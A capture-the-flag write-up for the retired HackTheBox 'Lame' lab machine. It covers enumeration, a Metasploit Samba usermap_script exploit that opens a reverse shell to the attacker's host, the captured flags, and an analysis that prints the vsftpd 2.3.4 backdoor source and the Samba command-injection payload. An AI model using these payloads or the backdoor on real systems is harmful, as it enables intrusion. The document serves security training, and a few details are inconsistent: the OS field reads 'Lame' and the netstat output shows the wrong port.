---
description: Retired - Lame Machine Detailed Writeup.
cover: ../.gitbook/assets/bg (1).png
coverY: -47.96423248882266
---

# Lame Writeup

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### Information

| Property       | Value      |
| -------------- | ---------- |
| **Name**       | Lame       |
| **IP Address** | 10.10.10.3 |
| **OS**         | Lame       |
| **Difficulty** | Easy       |

### Enumeration

#### Nmap Scan

```bash
nmap -sC -sV -oN nmap_scan.txt -Pn 
```

```
PORT    STATE SERVICE     REASON  VERSION
21/tcp  open  ftp         syn-ack vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         syn-ack OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBALz4hsc8a2Srq4nlW960qV8xwBG0JC+jI7fWxm5METIJH4tKr/xUTwsTYEYnaZLzcOiy21D3ZvOwYb6AA3765zdgCd2Tgand7F0YD5UtXG7b7fbz99chReivL0SIWEG/E96Ai+pqYMP2WD5KaOJwSIXSUajnU5oWmY5x85sBw+XDAAAAFQDFkMpmdFQTF+oRqaoSNVU7Z+hjSwAAAIBCQxNKzi1TyP+QJIFa3M0oLqCVWI0We/ARtXrzpBOJ/dt0hTJXCeYisKqcdwdtyIn8OUCOyrIjqNuA2QW217oQ6wXpbFh+5AQm8Hl3b6C6o8lX3Ptw+Y4dp0lzfWHwZ/jzHwtuaDQaok7u1f971lEazeJLqfiWrAzoklqSWyDQJAAAAIA1lAD3xWYkeIeHv/R3P9i+XaoI7imFkMuYXCDTq843YU6Td+0mWpllCqAWUV/CQamGgQLtYy5S0ueoks01MoKdOMMhKVwqdr08nvCBdNKjIEd3gH6oBk/YRnjzxlEAYBsvCmM4a0jmhz0oNiRWlc/F+bkUeFKrBx/D2fdfZmhrGg==
|   2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcdYfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo3HJjYucg87JjLeC66I7+dlEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew==
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

### Initial Access

#### Port \[21] - \[vsFTPd 2.3.4] (False Positive)

Anonymous login enabled, and version affected by a backdoor installed in its core, according to [Vigilance.fr](https://vigilance.fr/vulnerability/vsftpd-backdoor-in-version-2-3-4-10805), between the 30th of June 2011 and the 3rd of July 2011, a backdoor was added in the source code. This backdoor detects if the login starts by ":)", and then opens a shell on the port 6200/tcp.

#### Port \[139] - \[Samba]

```
seifallah@seifallah-pwnbox:~/Documents/htb/lame$ smbmap -H 10.10.10.3 
[+] IP: 10.10.10.3:445	Name: 10.10.10.3                                        
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	tmp                                               	READ, WRITE	oh noes!
	opt                                               	NO ACCESS	
	IPC$                                              	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$                                            	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
seifallah@seifallah-pwnbox:~/Documents/htb/lame$ 

```

**Vulnerability Exploited**

Samba 3.0.20 affected by [CVE-2007-2447](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap\_script/), by specifying a username containing shell meta characters, attackers can execute arbitrary commands. No authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication!

**Exploitation Steps**

```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > search usermap_script 
...
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution
...
msf6 exploit(multi/samba/usermap_script) > set rhosts 10.10.14.5
rhosts => 10.10.14.5
msf6 exploit(multi/samba/usermap_script) > set lhosts 10.10.14.5
[!] Unknown datastore option: lhosts. Did you mean LHOST?
lhosts => 10.10.14.5
msf6 exploit(multi/samba/usermap_script) > set lhost 10.10.14.5
lhost => 10.10.14.5
msf6 exploit(multi/samba/usermap_script) > set rhosts 10.10.10.3
rhosts => 10.10.10.3
msf6 exploit(multi/samba/usermap_script) > run 

[*] Started reverse TCP handler on 10.10.14.5:4444 
[*] Command shell session 1 opened (10.10.14.5:4444 -> 10.10.10.3:35431) at 2023-11-14 19:09:02 +0100

id
uid=0(root) gid=0(root)

```

#### User Access

The exploit led to root privileges.

**User Flag**

`db8451e9e86a5854d3bb8e71598a30b4`

### Privilege Escalation

*

**Root Flag**

`f7364bd52d75cae5d3ad5d1e43d3fdbc`

### Conclusion

### Additional Notes

#### vsftpd Backdoor Analysis

This CVE is a backdoor in the **vsftpd** FTP server version **2.3.4**. The master site hosting the downloadable client had a backdoored version uploaded. The backdoor works by checking if the username string ends with a smiley face “:)”; after which it calls `vsf_sysutil_extra()`. The called function then binds to port 6200 and awaits a connection. Any command then issued to that port gets executed via `execl`.

![](<Lame Writeup - Backdoor Trigger.png>)

Using `netstat -tnlp`, backdoor launch confirmed:

```bash
tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      5645/Xtightvnc
```

**Backdoor Code Snippet**

https://pastebin.com/AetT9sS5

```c
int
vsf_sysutil_extra(void)
{
  int fd, rfd;
  struct sockaddr_in sa;
  if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
  exit(1); 
  memset(&sa, 0, sizeof(sa));
  sa.sin_family = AF_INET;
  sa.sin_port = htons(6200);
  sa.sin_addr.s_addr = INADDR_ANY;
  if((bind(fd,(struct sockaddr *)&sa,
  sizeof(struct sockaddr))) < 0) exit(1);
  if((listen(fd, 100)) == 1) exit(1);
  for(;;)
  { 
    rfd = accept(fd, 0, 0);
    close(0); close(1); close(2);
    dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
    execl("/bin/sh","sh",(char *)0); 
  } 
}

```

#### CVE-2007-2447 (SMB) Analysis

**Vulnerable Code Snippet**

```c
/* first try the username map script */

if ( *cmd ) {
        char **qlines;
        pstring command;
        int numlines, ret, fd;

        pstr_sprintf( command, "%s \"%s\"", cmd, user );

        DEBUG(10,("Running [%s]\n", command));
        ret = smbrun(command, &fd);
        DEBUGADD(10,("returned [%d]\n", ret));

        if ( ret != 0 ) {
                if (fd != -1)
                        close(fd);
                return False;
        }
```

The _**smbrun()**_ function is responsible for executing system commands, using backticks \`\` or $() makes command execution possible

![](<Lame Writeup - SMB Clean Paload.png>)

Multiple available exploits including the metasploit module requires inserting the ``/=`nohup`` before the malicious payload, the equal sign is not required and the nohup command keep processes running even after exiting the shell or terminal.

```ruby
 def exploit
    vprint_status('Use Rex client (SMB1 only) since this module is not compatible with RubySMB client')
    connect(versions: [1])
    # lol?
    username = "/=`nohup " + payload.encoded + "`"
    begin
      simple.client.negotiate(false)
      simple.client.session_setup_no_ntlmssp(username, rand_text(16), datastore['SMBDomain'], false)
    rescue ::Timeout::Error, XCEPT::LoginError
      # nothing, it either worked or it didn't ;)
    end
    handler
  end
end
```

The slash / is ued for seperating the username and the Domain as shown below.

![](<Lame Writeup - SMB Malicious Request.png>)

### Resources

https://vigilance.fr/vulnerability/vsftpd-backdoor-in-version-2-3-4-10805 https://systemweakness.com/a-look-at-cve-2011-2523-and-cve-2007-2447-493c1027965d
